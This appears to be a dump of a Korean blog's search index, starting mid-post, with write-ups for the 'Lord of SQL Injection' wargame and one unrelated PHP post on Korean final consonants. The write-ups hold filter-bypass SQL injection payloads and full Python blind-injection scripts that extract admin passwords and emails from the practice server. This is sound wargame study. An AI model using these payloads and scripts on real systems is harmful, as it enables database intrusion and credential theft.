계정의 no를 알아내는 것이다.주어진 쿼리문이다.$query = &quot;select id from prob_red_dragon where id=&#39;{$_GET[&#39;id&#39;]}&#39; and no={$no}&quot;;이것만 보면 상당히 간단해보이는 문제다.no를 맞춰주는 것이 목표이기 때문에, id값을 닫아주고 뒷부분을 주석으로 날려준 후 $no는 개행해주면 된다.이전에 마주친 적이 있었던 것 같은 문제다.이 경우의 페이로드 예시는 다음과 같다.[1] id 페이로드&#39;||no=%23 딱 7자다.[2] pw 페이로드%0a[비교할숫자]페이로드에 의해 변조된 쿼리문은 다음과 같아진다.$query = &quot;select id from prob_red_dragon where id=&#39;&#39;||no=#&#39; and no= [비교할숫자]&quot;;따라서, no=[비교할숫자] 일 시 Hello admin이 출력된다.기다리다보면 나타나겠지의 심산으로자동화 도구를 이용해 0부터 하나하나 올라가봤지만… 시간이 아무리 지나도 답을 뱉지 않았다.이유를 고민해보니… 아무래도 엄청 큰 수인 것 같았다.때문에 no의 대략적인 범위를 찾아내는 것으로 접근 방법을 바꿨다.새로운 접근의 페이로드 예시는 다음과 같다.[1] id 페이로드&#39;||no&amp;gt;%23 = ⇒ &amp;gt;[2] pw 페이로드%0a[비교할숫자]먼저, url에 직접 페이로드를 전달하여 대략적인 자릿수를 알아내고자 했다.그 결과…찾고 있는 숫자가 무려 500000000대라는 이보다 대략적일 수 없는 정보를 얻었다.이진탐색을 적용한다고 해도 터무니 없이 큰 숫자다.별 수 없이 위에서부터 한자리씩 숫자를 바꿔가며 범위를 찾고 있자니…상당히 찝찝했지만 이틀 밤을 샌 관계로 더 이상은 한계였다…그냥 내려놓고 찾기로 했다.한참을 찾은 끝에…586482013에서는 뜨는 admin이586482014에서는 뜨지 않는 것을 발견했다!이로써 답은 586482014임을 확신할 수 있었다…결과" }, { "title": "한글 종성 유무의 판별", "url": "/posts/Korean-jongsung/", "categories": "Back-End, PHP", "tags": "", "date": "2021-12-20 00:00:00 +0900", "snippet": "한글 종성 유무의 판별1. 전체 코드$last = iconv_substr($search, -1, 1, &quot;utf-8&quot;);$dec = substr(mb_convert_encoding($last,&#39;HTML-ENTITIES&#39;,&#39;UTF-8&#39;),2,-1);$nums = array(&quot;3&quot;,&quot;6&quot;,&quot;0&quot;);if($dec&amp;gt;=44032 &amp;amp;&amp;amp; $dec&amp;lt;=55203){ if(($dec-44032)%28!=0){ $josa = &quot;으로&quot;; }else{ $josa = &quot;로&quot;; }}elseif(in_array($last, $nums)){ $josa = &quot;으로&quot;;}else{ $josa = &quot;로&quot;;}2. 한 줄 씩 뜯어보기 검색어의 마지막 글자를 가져온다. 한글을 있는 그대로 자르려면 iconv_substr를 사용해주어야 한다.$last = iconv_substr($search, -1, 1, &quot;utf-8&quot;); $last를 10진수로 바꿔준다.$dec = substr(mb_convert_encoding($last,&#39;HTML-ENTITIES&#39;,&#39;UTF-8&#39;),2,-1); 발음할 때 삼, 육, 십이 되는 숫자를 배열에 넣어준다.$nums = array(&quot;3&quot;,&quot;6&quot;,&quot;0&quot;); 해당 문자가 한글인지 판별한다.if($dec&amp;gt;=44032 &amp;amp;&amp;amp; $dec&amp;lt;=55203) 해당 문자에서 44032을 뺀 값이 28로 나누어 떨어지지 않는다면 → 받침이 있는 글자이다.if(($dec-44032)%28!=0) 유니코드 = 44032 + (초성 * 21 + 중성) * 28 + 종성 따라서 종성이 있는 글자는 유니코드-44032를 28로 나누었을 때 나머지가 남게 된다. 참고로 위 공식에서의 초성, 중성, 종성은 각 자모의 Index를 말한다. 경우에 따른 조사의 형태를 정해준다.$josa = &quot;으로&quot; / $josa = &quot;로&quot;3. 결과" }, { "title": "LOS - 25번 green_dragon", "url": "/posts/los-25/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-19 00:00:00 +0900", "snippet": "[25] green_dragon문제풀이[1] id 페이로드\\[2] pw 페이로드union select char(92), char(117,110,105,111,110,32,115,101,108,101,99,116,32,99,104,97,114,40,57,55,44,49,48,48,44,49,48,57,44,49,48,53,44,49,49,48,41,32,35) %23따라서, 최종 페이로드는 다음과 같다.?id=\\&amp;amp;pw=union select char(92), char(117,110,105,111,110,32,115,101,108,101,99,116,32,99,104,97,114,40,57,55,44,49,48,48,44,49,48,57,44,49,48,53,44,49,49,48,41,32,35) %23결과" }, { "title": "LOS - 24번 evil_wizard", "url": "/posts/los-24/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-18 00:00:00 +0900", "snippet": "[24] evil_wizard문제풀이소스 코드만 보면 이전 문제와 완전히 같다.물론 같은 문제일리가 없으니 테이블 내부 데이터를 확인해본다.다음은 order=1을 페이로드로 전달했을 때 볼 수 있는 테이블이다.이번 문제는 id ASC로 정렬해도, score ASC로 정렬해도 그 결과가 같을 것임을 예상할 수 있다.그렇다면 이번에는,if 조건문의 참/거짓에 따라 각각 “1 ASC”와 “1 DESC”를 반환해주면 될 것 같다.그렇게 해주면 if문의 조건이 참인 경우,admin 레코드가 위로 올라가게 되며, 이 경우 res.text에는 50&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;rubiya 가 포함될 것이다.따라서, 전달해줄 페이로드는 다음과 같다.[1] pw 길이 찾기?order=if(id=&#39;admin&#39; and length(email)=[길이], &#39;1 ASC&#39;, &#39;1 DESC&#39;)[2] 완전한 pw 찾기?order=if(id=&#39;admin&#39; and ascii(substr(email,{len},1))=[아스키], &#39;1 ASC&#39;, &#39;1 DESC&#39;)[3] 참 판별if(&quot;50&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;rubiya&quot; in res.text)LoS 24번 Python 자동화 코드이다.import requestsdef send(param): url = &quot;https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php&quot; cookie = &quot;tp0ja8gkvp5j75fm5lntqomope&quot; head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} my_url = url+param res = requests.get(my_url, cookies=head) return res.textprint(&quot;💘 LoS 24를 시작합니다&quot;)for num in range(0,100): param=f&quot;?order=if(id=&#39;admin&#39; and length(email)={num}, &#39;1 ASC&#39;, &#39;1 DESC&#39;)&quot; if(&quot;50&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;rubiya&quot; in send(param)): print(f&quot;👏 email의 길이는 {num}입니다!&quot;) breakans=&quot;&quot;for len in range(1, num+1): start = 32 end = 127 while True: middle = round((start+end)/2) param=f&quot;?order=if(id=&#39;admin&#39; and ascii(substr(email,{len},1))&amp;gt;={middle}, &#39;1 ASC&#39;, &#39;1 DESC&#39;) %23&quot; if(&quot;50&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;rubiya&quot; in send(param)): param=f&quot;?order=if(id=&#39;admin&#39; and ascii(substr(email,{len},1))={middle}, &#39;1 ASC&#39;, &#39;1 DESC&#39;) %23&quot; if(&quot;50&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;rubiya&quot; in send(param)): print(f&quot;{len}번째 문자 → {chr(middle)}&quot;) ans+=chr(middle) break else: start = middle continue else: end = middle continueprint(f&quot;👏 email의 정체는 [{ans}]입니다!&quot;)Blind 공격 결과, admin의 email은 aasup3r_secure_email@emai1.com 임을 알 수 있다.결과" }, { "title": "LOS - 23번 hell_fire", "url": "/posts/los-23/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-16 00:00:00 +0900", "snippet": "[23] hell_fire문제풀이LoS 23번 Python 자동화 코드이다.import requestsdef send(param): url = &quot;https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php&quot; cookie = &quot;sdrjk57hqa404dvtb3akcpfvk1&quot; head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} my_url = url+param res = requests.get(my_url, cookies=head) return res.textprint(&quot;💘 LoS 23을 시작합니다&quot;)for num in range(0,100): param=f&quot;?order=if(id=&#39;admin&#39; and length(email)={num}, &#39;id&#39;, &#39;score&#39;)&quot; if(&quot;200&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;rubiya&quot; in send(param)): print(f&quot;👏 email의 길이는 {num}입니다!&quot;) breakans=&quot;&quot;for len in range(1, num+1): start = 32 end = 127 while True: middle = round((start+end)/2) param=f&quot;?order=if(id=&#39;admin&#39; and ascii(substr(email,{len},1))&amp;gt;={middle}, &#39;id&#39;, &#39;score&#39;) %23&quot; if(&quot;200&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;rubiya&quot; in send(param)): param=f&quot;?order=if(id=&#39;admin&#39; and ascii(substr(email,{len},1))={middle}, &#39;id&#39;, &#39;score&#39;) %23&quot; if(&quot;200&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;rubiya&quot; in send(param)): print(f&quot;{len}번째 문자 → {chr(middle)}&quot;) ans+=chr(middle) break else: start = middle continue else: end = middle continueprint(f&quot;👏 email의 정체는 [{ans}]입니다!&quot;)admin 계정의 email은 admin_secure_email@emai1.com 임을 확인할 수 있다. @ 뒷부분을 보면… emai1 이다. 깨알같은 함정?결과" }, { "title": "LOS - 22번 dark_eyes", "url": "/posts/los-22/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-14 00:00:00 +0900", "snippet": "[22] dark_eyes문제풀이이번 문제에서는 col, if, case, when, sleep, benchmark를 필터링하고 있다.전체적인 구조는 이전 문제와 크게 다르지 않은 Error Based Blind SQLi 문제이다. 이전 문제와는 달리 에러가 발생할 시 에러 메시지를 보여주지는 않지만 exit됨으로 인해 빈 화면이 출력되므로 그 자체로 에러 여부 판별이 가능하다.이번 문제의 핵심은 if문이나 case문을 사용하지 않고 특정 조건을 충족하는 경우에 에러를 발생시켜주는 것에 있다.이래저래 대체할 방법을 찾아봤지만… 방법은 딱 하나인 것 같았다.서브쿼리를 이용하는 것이다.사용할 페이로드의 예시는 다음과 같다.param=f&quot;?pw=&#39; || (SELECT 1 UNION SELECT 2 where id=&#39;admin&#39; and length(pw)={num}) %23&quot;① SELECT 1 UNION SELECT 2 서브쿼리가 둘 이상의 row를 반환하지 못한다는 특성을 이용하여, 해당 요소가 실행될 시 에러가 발생하게끔 유도한다.② where id=’admin’ and length(pw)={num} pw의 길이가 일치할 시 where절이 True가 되므로 ①번 요소가 실행되고, 그로 인한 에러가 발생하게 된다. 에러의 발생 유무를 판별하여 pw의 길이와 일치하는 num을 찾아낼 수 있다. 이후 완전한 pw를 찾는 방법도 동일한 로직을 사용한다.또한 이전 문제들과 마찬가지로, 2진 탐색을 적용하여 검색 속도를 높인다.LoS 22번 Python 자동화 코드이다.import requestsdef send(param): url = &quot;https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php&quot; cookie = &quot;dfksep8hnmequ6sm0qe1iu65pa&quot; head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} my_url = url+param res = requests.get(my_url, cookies=head) return res.textprint(&quot;💘 LoS 21을 시작합니다&quot;)for num in range(0,100): param=f&quot;?pw=&#39; || (SELECT 1 UNION SELECT 2 where id=&#39;admin&#39; and length(pw)={num}) %23&quot; if(&quot;query&quot; not in send(param)): print(f&quot;👏 pw의 길이는 {num}입니다!&quot;) breakans=&quot;&quot;for len in range(1, num+1): start = 32 end = 127 while True: middle = round((start+end)/2) param=f&quot;?pw=&#39; || (SELECT 1 UNION SELECT 2 where id=\\&quot;admin\\&quot; and ascii(substr(pw,{len},1))&amp;gt;={middle}) %23&quot; if(&quot;query&quot; not in send(param)): param=f&quot;?pw=&#39; || (SELECT 1 UNION SELECT 2 where id=\\&quot;admin\\&quot; and ascii(substr(pw,{len},1))={middle}) %23&quot; if(&quot;query&quot; not in send(param)): print(f&quot;{len}번째 문자 → {chr(middle)}&quot;) ans+=chr(middle) break else: start = middle continue else: end = middle continueprint(f&quot;👏 pw의 정체는 [{ans}]입니다!&quot;)Blind 공격 결과, pw는 5a2f5d3c 임을 확인할 수 있다.결과" }, { "title": "LOS - 21번 iron_golem", "url": "/posts/los-21/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-14 00:00:00 +0900", "snippet": "[21] iron_golem문제풀이solve 조건은 admin 계정의 pw를 알아내는 것이다.preg_match를 살펴보면 sleep과 benchmark를 필터링하고 있다.두 함수 모두 Time Based Blind SQLi에 쓰이는 함수다..과 _등을 함께 필터링하므로 헤비쿼리도 사용이 불가능하다.Timed Based로 접근하기 위한 방법이 모두 막혔으므로, 다른 방식으로 푸는 문제임을 유추할 수 있다. 헤비쿼리 : information_schema.columns 등을 여러개 join시켜 내부 데이터를 왕창 읽어들임으로써 시간을 지연시키는 방법이다.또한 지금까지의 문제들처럼 쿼리의 실행 결과를 보여주는 대신, 에러 발생 시 에러 메시지를 보여주고 있다. Hello {$result[id]} → mysqli_error($db)이러한 점들로 미루어 보아, Error Based로 접근해야하는 문제임을 짐작할 수 있다.Timed Based나 Error Based에 대해 제대로 공부해본 적이 없었기 때문에 여기까지 결론을 내리는데 많은 시간이 소요되었다…고의적으로 에러를 발생시키는 방법에는 여러가지가 있다. 이 때, 발생시켜야하는 에러는 Syntax Error가 아닌 Runtime Error이다.그 중 개인적으로 가장 간단하다고 생각한 방법인 큰 수 연산을 통해 문제를 해결해보았다.말 그대로, Integer 범위를 초과하는 과도한 연산을 요청함으로써 에러를 발생시키는 방법이다.먼저, 과도하게 큰 수의 연산을 요청했을 시의 에러 메시지의 내용을 확인해본다.다음은 pw의 페이로드로 ’ or 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF 를 주었을 시의 에러 메시지의 내용이다.위 에러 메시지 내용의 일부를 키워드로 활용하여 자동화 코드를 짜면 된다.나는 out of range를 선택했다. res.text에 out of range가 포함되어있을 시 에러가 발생한 것으로 판별한다.pw의 길이를 찾았을 시 에러를 발생시키기 위한 페이로드의 예시는 다음과 같다.param=f&quot;?pw=&#39; or id=&#39;admin&#39; and if(length(pw)={num}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23&quot;이후 완전한 pw를 찾는 방법도 동일한 로직을 사용한다.특정 인덱스의 아스키를 찾았을 시 에러를 발생시켜주면 된다.또한 이번 문제에서도 검색 속도를 높이기 위해 2진 탐색을 적용해준다.LoS 21번 Python 자동화 코드이다.import requestsdef send(param): url = &quot;https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php&quot; cookie = &quot;dfksep8hnmequ6sm0qe1iu65pa&quot; head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} my_url = url+param res = requests.get(my_url, cookies=head) return res.textprint(&quot;💘 LoS 21을 시작합니다&quot;)for num in range(0,100): param=f&quot;?pw=&#39; or id=&#39;admin&#39; and if(length(pw)={num}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23&quot; if(&quot;out of range&quot; in send(param)): print(f&quot;👏 pw의 길이는 {num}입니다!&quot;) breakans=&quot;&quot;for len in range(1, num+1): start = 32 end = 127 while True: middle = round((start+end)/2) param=f&quot;?pw=&#39; or id=\\&quot;admin\\&quot; and if(ascii(substr(pw,{len},1))&amp;gt;={middle}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23&quot; if(&quot;out of range&quot; in send(param)): param=f&quot;?pw=&#39; or id=\\&quot;admin\\&quot; and if(ascii(substr(pw,{len},1))={middle}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23&quot; if(&quot;out of range&quot; in send(param)): print(f&quot;{len}번째 문자 → {chr(middle)}&quot;) ans+=chr(middle) break else: start = middle continue else: end = middle continueprint(f&quot;👏 pw의 정체는 [{ans}]입니다!&quot;)Blind 공격 결과, pw는 06b5a6c16e8830475f983cc3a825ee9a 임을 확인할 수 있다.결과" }, { "title": "LOS - 20번 dragon", "url": "/posts/los-20/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-14 00:00:00 +0900", "snippet": "[20] dragon문제풀이주어진 쿼리문을 보겠다.$query = &quot;select id from prob_dragon where id=&#39;guest&#39;# and pw=&#39;{$_GET[pw]}&#39;&quot;;첫번째 조건절 뒤에 #을 넣어서 뒷부분을 날려버리고 있다.스터디 초반에 로그인 로직 5가지 유형을 개발할 때, 조건절이 개행 처리된 쿼리에는 주석을 주입해도 원하는대로 처리되지 않음을 경험했었다.이 점에 착안해서 개행 문자를 이용해주면 될 것 같다.즉, 쿼리문을 다음과 같이 변조할 생각이다.$query = &quot;select id from prob_dragon where id=&#39;guest&#39;# and pw=&#39; and pw=&#39;&#39; or id=&#39;admin&#39;&quot;;위 쿼리문은 다음 쿼리문과 동일하게 동작한다.$query = &quot;select id from prob_dragon where (id=&#39;guest&#39; and pw=&#39;&#39;) or id=&#39;admin&#39;&quot;;따라서 정상적으로 admin 계정을 fetch 해오게 된다.개행 문자인 \\n 은 url encoding을 거쳐 %0a로 입력해준다.입력할 답은 다음과 같다.%0a and pw=&#39;&#39; or id=&#39;admin결과" }, { "title": "LOS - 19번 xavis", "url": "/posts/los-19/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-13 00:00:00 +0900", "snippet": "[19] xavis문제풀이오랜만에 만나는 Blind SQLi 문제다.solve 조건은 언제나와 같이 admin 계정의 pw를 알아내는 것이다.preg_match를 보면 regex와 like를 필터링하고 있다.regex는 Sql 정규표현식인 regexp를 걸러내기 위한 것으로 보인다.정작 =는 필터링 하고 있지 않기 때문에 유의미한 제약이 있어보이진 않는다.그런데 너무 제약이 없다는 점이 좀 꺼림칙하다.겉으로 보기에는 그냥 기본적인 Blind 문제 같지만… 그럴리가 없는데…?아니나 다를까, 기존의 자동화 코드가 먹히질 않았다.필터에 걸린 것도 뭐가 잘못된 것도 아닌데 아스키 코드를 전체 다 돌고도 맞는 문자를 뽑아내오지 못했다.불현듯 머릿속을 스친 생각은… 아 이거 한글인 것 같다ㅋㅋㅋㅋㅋㅠ한글은 유니코드 문자셋을 통해 표현되기 때문에 당연한 말이지만 아스키 번호를 백날 돌아봐야 찾을 수가 없다.한글로 된 데이터를 탐색하는 방법에는 여러가지가 있을 수 있겠지만 새로운 챌린지가 생긴 김에 그냥 내 식대로 (야매로) 한번 접근해보았다…ㅎ!한글을 표현하는 유니코드는 정해진 16진수 값을 갖고 있고, 이 값들은 10진수로 변환이 가능하다.10진수로 표현된 값은 대소 비교가 가능하다는 점과 이전에 몇번 등장했었던 ord 함수를 이용해보았다. 한글 유니코드 10진수 : 44032 ‘가’ ~ 55203 ‘힣’ ord : 해당 문자의 유니코드 값을 반환하는 함수 추가로, 이전까지와는 달리 탐색해야하는 번호의 개수가 무지막지하게.. 많기 때문에세월아 네월아 하나하나 탐색해서는 시간이 과도하게 오래 걸리게 되는 문제에 직면하게 되었다.그래서 미뤄뒀던 2진 탐색 알고리즘까지 한번 구현해보았다.2진 탐색을 적용한 LoS 19번 Python 자동화 코드이다.import requestsdef send(param): url = &quot;https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php&quot; cookie = &quot;dfksep8hnmequ6sm0qe1iu65pa&quot; head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;} my_url = url+param res = requests.get(my_url, cookies=head) return res.textprint(&quot;💘 LoS 19를 시작합니다&quot;)ans = &quot;&quot;endpoint = Falsefor len in range(1, 30): if(endpoint): break print(f&quot;{len}번째 문자에 대해 검색합니다..&quot;) start = 44032 end = 55203 while True: if(endpoint): print(f&quot;{len}번째 문자는 존재하지 않습니다.&quot;) print(f&quot;👏 pw의 정체는 [{ans}]입니다!&quot;) break if(start==end): endpoint = True middle = round((start+end)/2) param=f&quot;?pw=&#39; || id=\\&quot;admin\\&quot; %26%26 ord(substr(pw,{len},1))&amp;gt;={middle} %23&quot; if(&quot;Hello admin&quot; in send(param)): param=f&quot;?pw=&#39; || id=\\&quot;admin\\&quot; %26%26 ord(substr(pw,{len},1))={middle} %23&quot; if(&quot;Hello admin&quot; in send(param)): print(f&quot;{len}번째 문자의 십진수 → {middle}&quot;) ans += chr(middle) break else: start = middle continue else: end = middle continue① HTTP 요청을 보내는 과정을 send() 함수로 분리했다.② Sql에서 한글은 3Byte로 저장되는데, 이런저런 예외사항이 있기 때문에 length 함수로 정확한 문자열의 길이를 알아낼 수는 없다고 한다. 그래서 그냥 1부터 30까지 돌다가 pw를 완전히 찾으면 알아서 반복문을 탈출하게끔 구현했다. 설마 pw가 30자 보다 길진 않겠지…③ 한글이 아닌 다른 문자가 섞여있을 시에는 사용할 수 없다는 분명한 한계점이 있다. 일단 시도해보고 안되면 수정하려고 했지만 운이 좋게도 pw가 그냥 한글 뿐이라서 여기서 구현이 종료되었다. 추가적인 구현을 해야 됐었더라면, 아마 해당 문자의 ord 값이 44032 보다 작을 시 바로 아스키 번호를 돌게끔 해주었을 것 같다.다음은 해당 코드의 실행 결과이다.Blind 공격 결과, 입력할 답은 우왕굳 이다.결과" }, { "title": "LOS - 18번 nightmare", "url": "/posts/los-18/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-12 00:00:00 +0900", "snippet": "[18] nightmare문제풀이이번 문제에서는 #과 -를 추가로 필터링해주고 있다.자주 사용되는 형식의 주석을 필터링하기위한 목적으로 보인다.또한, strlen을 이용해 pw의 페이로드 길이를 6Byte 이하로 제한하고 있다.주어진 쿼리문을 보겠다.$query = &quot;select id from prob_nightmare where pw=(&#39;{$_GET[pw]}&#39;) and id!=&#39;admin&#39;&quot;;solve 조건은 아무 id나 fetch 해오는 것이다.따라서, and를 기준으로① pw=(‘{$_GET[pw]}’) 까지를 True로 만들어주고② and id!=’admin’ 부분을 날려주면 될 것 같다.②번의 경우에는, #과 –에 필터링이 걸려있으므로;%00을 주석으로 사용해주면 된다. 참고로, 바로 앞 문자와 띄우지 않고 붙여서 써주어야 하는 것으로 보인다.①번이 관건인데, 6글자 길이 제한 때문에 최대한 단순하게 True문을 만들어주어야 한다.아무리 생각해도 적절한 방법이 떠오르지 않아서 구글링으로 힌트를 구했는데,Sql에서 숫자 없이 문자로만 이루어진 문자열은 0으로 자동 형변환된다고 한다.대표적인 예시로, (‘’)=0 은 참이다.이상의 분석을 통해, 입력할 답은 다음과 같다.&#39;)=0;%00결과" }, { "title": "LOS - 17번 assassin", "url": "/posts/los-17/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-10 00:00:00 +0900", "snippet": "[17] assassin문제풀이처음 보는 함수가 나왔다.strrev는 입력받은 문자열을 거꾸로 뒤집어서 반환하는 함수다.strrev(“hello”) ⇒ olleh이런 식이다.주의할 점은, Byte 단위로 뒤집기 때문에 2Byte 문자인 한글이 들어가면 깨지게 된다는 점이다.이번 문제에서는 여러번 접했었던 addslashes를 좀 더 정확히 볼 필요가 있을 것 같다.addslashes는 싱글쿼터, 더블쿼터, 역슬래시, Null Byte 앞에 역슬래시를 붙여주는 함수다.주어진 쿼리문을 보겠다.$query = &quot;select id from prob_zombie_assassin where id=&#39;{$_GET[id]}&#39; and pw=&#39;{$_GET[pw]}&#39;&quot;;쿼리문 자체는 16번 문제와 다른 점이 없다.16번에서는 id에 역슬래시, pw에 or 1=1 %23 을 주어 문제를 풀었었다.이번 문제에서 새로 고려하여야하는 점은① 역슬래시가 이스케이핑 될 것이라는 점과② strrev에 의해 문자열이 거꾸로 읽힐 것이라는 점이다.pw의 경우는 간단하다. 그냥 문자열을 거꾸로 입력해주면 된다. %23 1=1 roid가 이 문제의 포인트인데,싱글쿼터, 더블쿼터, 역슬래시, Null Byte를 id의 페이로드로 주었을 때를 각각 살펴보겠다.[1] 싱글쿼터 (id=’&amp;amp;pw=%23 1=1 ro)addslashes ⇒ \\’strrev ⇒ ‘\\최종 쿼리 ⇒ where id=’‘\\’ and pw=’or 1=1 %23’ 잘못된 접근이다. 싱글쿼터에 의해 id의 파라미터 부분이 바로 닫혀버린 후, \\‘가 바깥에 남겨지므로 올바르지 않은 쿼리문이 만들어진다.[2] 더블쿼터 (id=”&amp;amp;pw=%23 1=1 ro)addslashes ⇒ \\”strrev ⇒ “\\최종 쿼리 ⇒ where id=’”\\’ and pw=‘or 1=1 %23’ 올바른 접근이다! 빨간색 부분이 통째로 id의 파라미터로 취급된다. FALSE or TRUE 이므로 문제가 풀릴 것이다. solve [3] 역슬래시 (id=\\&amp;amp;pw=%23 1=1 ro)addslashes ⇒ \\\\strrev ⇒ \\\\최종 쿼리 ⇒ where id=’\\\\’ and pw=’or 1=1 %23’ 잘못된 접근이다. \\는 일반 문자 역슬래시로 취급되므로, 빨간색 부분이 id의 파라미터가 된다.[4] Null Byte (id=%00&amp;amp;pw=%23 1=1 ro)addslashes ⇒ \\0strrev ⇒ 0\\최종 쿼리 ⇒ where id=’0\\’ and pw=‘or 1=1 %23’ 올바른 접근이다! 빨간색 부분이 통째로 id의 파라미터로 취급된다. FALSE or TRUE 이므로 문제가 풀릴 것이다. solve 이상의 분석을 통해, 정답은 두 가지임을 확인했다.id=&quot;&amp;amp;pw=%23 1=1 roid=%00&amp;amp;pw=%23 1=1 ro결과" }, { "title": "LOS - 16번 succubus", "url": "/posts/los-16/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-09 00:00:00 +0900", "snippet": "[16] succubus문제풀이싱글쿼터 우회에는 두 가지 방법이 있다.첫번째는 그냥 더블쿼터를 쓰는 것이다.그러나 더블쿼터로는 서버측 쿼리문에 열려있는 싱글쿼터를 닫아줄 수가 없기 때문에 쿼리문을 원하는 방향으로 아예 틀어줄 수는 없다.두번째는 아주 한정적인 상황에서만 쓸 수 있는 방법이다.이번 문제처럼 두개 이상의 파라미터를 받고 있을 때, 그리고 둘 모두 싱글쿼터에 감싸져 있을 때만 사용할 수 있다.그 내용은 다음과 같다.id=’ ‘ and pw=’ ‘id=’\\’ and pw=’ or 1=1 %23 ‘첫번째 파라미터로 역슬래시(\\)를 줘서 바로 뒤의 싱글쿼터를 일반 문자로 이스케이프 시켜주는 것이다.그렇게 해주면 빨간색 부분이 통째로 id의 파라미터가 되어버린다.그 후, 두번째 파라미터로 or 1=1 %23 을 주면 문제없이 첫번째 레코드를 뽑아올 수 있게 된다.(∵ FALSE or TRUE ⇒ TRUE 가 되므로)따라서, 입력할 답은 다음과 같다.id=\\&amp;amp;pw=or 1=1 %23결과" }, { "title": "LOS - 15번 assassin", "url": "/posts/los-15/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-09 00:00:00 +0900", "snippet": "[15] assassin문제풀이또 새로운 유형이다.싱글쿼터 필터링을 우회할 방법이 딱히 보이지 않는다.이 경우, 아마도 like절의 특성을 이용하여 admin 레코드를 뽑아오는 문제인 것 같았다.먼저, like절에 사용되는 패턴에 대해 간단히 표로 정리해보았다. SELECT * FROM 테이블 WHERE 컬럼 LIKE [PATTERN] % 모든 문자 _ 한 글자 A% A로 시작하는 모든 문자 %A A로 끝나는 모든 문자 %A% A를 포함하는 모든 문자 패턴을 살펴보니, pw=% 를 입력할 시 해당 테이블의 첫번째 레코드를 뽑아오게 될 것 같았다.(∵ 모든 데이터가 해당 조건을 만족하므로)보통 테이블의 첫번째 레코드는 admin 계정이기 때문에 설마하는 마음으로 한번 입력해봤다.첫번째 레코드는 guest 계정이었다.어떻게 admin을 뽑아올 지 고민한 결과.. 내리게 된 결론은 Brute Force 였다.pw의 첫번째 자리에 0% ~ Z% 모든 경우의 수를 대입하여 Hello admin이 뜨는 경우를 찾는 것이다.다만 이 방법을 사용할 때는 반드시 고려해야할 점이 있는데,guest 계정과 admin 계정의 pw 앞부분이 겹칠 수 있다는 점이다.때문에 적절한 대처 방법이 필요한데… 자세한 내용은 아래의 코드를 보면서 설명한다.다음은 이번 문제를 풀기 위해 짜본 Python 자동화 코드이다.import requestsurl = &quot;https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php&quot;cookie = &quot;spin7uv9vl2fjnjet0tsug5eb6&quot;head = {&quot;PHPSESSID&quot;:f&quot;{cookie}&quot;}guest = &quot;&quot;admin = &quot;&quot;finish = Falseprint(&quot;💘 Brute Force를 시작합니다&quot;)for len in range(1, 30): if (finish==True): break print(f&quot;{len}번째 문자에 대해 검색중입니다..&quot;) for ran in range(48, 127): search = guest+chr(ran) param = f&quot;?pw={search}%&quot; my_url = url+param res = requests.get(my_url, cookies=head) if (&quot;Hello admin&quot; in res.text): admin = search+&quot;%&quot; print(f&quot;👏 적절한 검색어는 {admin}입니다!&quot;) finish = True break elif (&quot;Hello guest&quot; in res.text): guest += chr(ran) break[0] 먼저, 빈 문자열인 guest와 admin을 선언해준다.[1-1] 첫번째 문자에 대해 ASCII 48~126를 탐색하는 도중 Hello admin이 떴을 시, guest(빈 문자열)+해당 문자열+%을 admin에 할당하고 중첩반복문을 완전히 탈출해준다.[1-2] 첫번째 문자에 대해 ASCII 48~126를 탐색하는 도중 Hello guest가 떴을 시, 해당 문자열을 guest에 추가하고 다음 루프로 넘어가준다. Hello admin이 뜨지 않고 Hello guest가 떴다면, 이는 admin 계정과 guest 계정의 pw 첫번째 문자가 겹친다는 뜻이다. 둘의 문자가 같을 시 테이블 상 첫번째 레코드인 guest 계정이 fetch 되기 때문이다.[2-1] 첫번째 문자를 고정한 채로 두번째 문자에 대해 ASCII 48~126를 탐색하는 도중 Hello admin이 